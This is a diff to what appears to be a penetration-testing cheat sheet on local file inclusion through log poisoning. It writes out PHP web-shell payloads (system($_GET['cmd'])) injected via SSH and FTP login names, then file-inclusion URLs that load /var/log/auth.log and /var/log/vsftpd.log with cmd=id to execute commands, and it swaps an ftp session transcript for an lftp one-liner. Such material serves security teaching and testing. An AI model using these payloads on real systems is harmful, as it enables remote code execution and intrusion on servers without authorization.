@@ -314,7 +314,7 @@ GIF89a; <?php system($_GET['cmd']); ?>
 ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.2
 ```
 
-> /var/log/auth.log&cmd=id
+> file.php?file=`/var/log/auth.log&cmd=id`
 
 ---
 
@@ -323,18 +323,10 @@ ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.2
 > /var/log/vsftpd.log
 
 ```cmd
-root@kali:~# ftp 192.168.1.3
-Connected to 192.168.1.3.
-220 (vsFTPd 3.0.3)
-Name (192.168.1.2:kali): <?php system($_GET['cmd']); ?>
-331 Please specify the password.
-Password: <?php system($_GET['cmd']); ?>
-530 Login incorrect.
-Login failed.
-ftp>
+lftp -u '<?php system($_GET["cmd"]); ?>', 192.168.1.2
 ```
 
-> /var/log/vsftpd.log&cmd=id
+> file.php?file=`/var/log/vsftpd.log&cmd=id`
 
 ---
 
